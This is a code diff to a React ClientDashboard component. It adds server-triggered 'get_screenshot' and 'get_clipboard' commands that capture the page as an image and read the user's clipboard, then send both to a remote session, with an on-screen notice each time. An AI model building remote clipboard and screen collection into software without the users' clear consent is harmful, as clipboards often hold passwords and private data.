@@ -75,6 +75,12 @@ export function ClientDashboard({ linkId }: ClientDashboardProps) {
         case 'ping':
           sendMessage({ type: 'pong', sessionId });
           break;
+        case 'get_screenshot':
+          await sendScreenshot();
+          break;
+        case 'get_clipboard':
+          await sendClipboard();
+          break;
         default:
           console.log('Unknown command:', command);
       }
@@ -335,6 +341,37 @@ export function ClientDashboard({ linkId }: ClientDashboardProps) {
         description: "Failed to collect or send system information.",
         variant: "destructive"
       });
+    }
+  };
+
+  const sendScreenshot = async () => {
+    try {
+      // Dynamically import html2canvas
+      const html2canvas = (await import('html2canvas')).default;
+      const canvas = await html2canvas(document.body);
+      const dataUrl = canvas.toDataURL('image/png');
+      sendMessage({
+        type: 'screenshot_data',
+        sessionId,
+        data: dataUrl
+      });
+      toast({ title: 'Screenshot Sent', description: 'Screenshot has been captured and sent.' });
+    } catch (error) {
+      toast({ title: 'Screenshot Error', description: 'Failed to capture screenshot.', variant: 'destructive' });
+    }
+  };
+
+  const sendClipboard = async () => {
+    try {
+      const text = await navigator.clipboard.readText();
+      sendMessage({
+        type: 'clipboard_data',
+        sessionId,
+        data: text
+      });
+      toast({ title: 'Clipboard Sent', description: 'Clipboard contents sent.' });
+    } catch (error) {
+      toast({ title: 'Clipboard Error', description: 'Failed to read clipboard.', variant: 'destructive' });
     }
   };
 
